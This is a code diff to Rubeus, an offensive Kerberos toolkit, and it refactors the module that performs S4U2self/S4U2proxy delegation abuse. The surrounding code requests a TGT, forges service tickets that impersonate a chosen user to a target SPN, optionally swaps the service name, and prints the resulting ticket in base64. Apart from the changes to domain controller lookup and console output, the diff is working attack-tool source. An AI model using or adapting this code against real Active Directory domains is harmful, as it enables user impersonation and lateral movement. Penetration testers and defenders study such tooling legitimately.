@@ -10,13 +10,16 @@ namespace Rubeus
         public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "")
         {
             // first retrieve a TGT for the user
-            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, false);
-            Console.WriteLine();
+            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, false, domainController);
 
             if (kirbiBytes == null)
             {
                 Console.WriteLine("[X] Error retrieving a TGT with the supplied parameters");
                 return;
+            }
+            else
+            {
+                Console.WriteLine("\r\n");
             }
 
             // transform the TGT bytes into a .kirbi file
@@ -36,18 +39,9 @@ namespace Rubeus
             byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
 
-            // grab the default DC if none was supplied
-            if (String.IsNullOrEmpty(domainController))
-            {
-                domainController = Networking.GetDCName();
-                if (String.IsNullOrEmpty(domainController))
-                {
-                    return;
-                }
-            }
+            string dcIP = Networking.GetDCIP(domainController);
+            if (String.IsNullOrEmpty(dcIP)) { return; }
 
-            System.Net.IPAddress[] dcIP = System.Net.Dns.GetHostAddresses(domainController);
-            Console.WriteLine("[*] Using domain controller: {0} ({1})", domainController, dcIP[0]);
             Console.WriteLine("[*] Building S4U2self request for: '{0}\\{1}'", domain, userName);
             Console.WriteLine("[*]   Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
             if (!String.IsNullOrEmpty(altService))
@@ -66,7 +60,7 @@ namespace Rubeus
             byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, false, targetUser);
 
             Console.WriteLine("[*] Sending S4U2self request");
-            byte[] response = Networking.SendBytes(dcIP[0].ToString(), 88, tgsBytes);
+            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
             if (response == null)
             {
                 return;
@@ -121,7 +115,7 @@ namespace Rubeus
                 byte[] s4ubytes = s4u2proxyReq.Encode().Encode();
 
                 Console.WriteLine("[*] Sending S4U2proxy request");
-                byte[] response2 = Networking.SendBytes(dcIP[0].ToString(), 88, s4ubytes);
+                byte[] response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
                 if (response == null)
                 {
                     return;
@@ -198,7 +192,7 @@ namespace Rubeus
                             info.sname.name_string = encRepPart2.sname.name_string;
 
                             // if we want an alternate sname, substitute it into the encrypted portion of the KRB_CRED
-                            Console.WriteLine("\r\n[*] Substituting alternative service name '{0}'", altSname);
+                            Console.WriteLine("[*] Substituting alternative service name '{0}'", altSname);
                             info.sname.name_string[0] = altSname;
 
                             // add the ticket_info into the cred object
@@ -279,7 +273,7 @@ namespace Rubeus
 
                         string kirbiString = Convert.ToBase64String(kirbiBytes);
 
-                        Console.WriteLine("\r\n[*] base64(ticket.kirbi) for SPN '{0}':\r\n", targetSPN);
+                        Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}':\r\n", targetSPN);
 
                         // display the .kirbi base64, columns of 80 chararacters
                         foreach (string line in Helpers.Split(kirbiString, 80))
